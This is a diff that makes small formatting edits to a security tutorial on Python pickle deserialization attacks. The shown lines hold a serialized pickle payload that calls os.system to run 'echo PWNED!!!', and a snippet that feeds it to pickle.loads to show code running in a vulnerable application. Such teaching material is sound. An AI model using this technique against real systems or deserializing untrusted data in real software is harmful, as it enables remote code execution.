@@ -146,7 +146,8 @@ pickle_data = pickle.dumps(Evil())
 print(pickle_data)
 ```
 
-The output will produce the serialized byte stream: ```b'\x80\x04\x95(\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\recho PWNED!!!\x94\x85\x94R\x94.'```. We can pass this as input to a vulnerable application that attempts to directly deserialize this without any sanitization. This is demonstrated as follows:
+The output will produce the serialized byte stream: ```b'\x80\x04\x95(\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\recho PWNED!!!\x94\x85\x94R\x94.'```.
+We can pass this as input to a vulnerable application that attempts to directly deserialize this without any sanitization. This is demonstrated as follows:
 
 ```python
 import pickle
@@ -155,7 +156,7 @@ evil_input = b'\x80\x04\x95(\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x0
 unpickled_data = pickle.loads(evil_input)
 ```
 
-On deserialization, the reduce method is called and as a result, code is executed
+On deserialization, the reduce method is called and as a result, code is executed:
 
 ```console
 $ python3 test.py
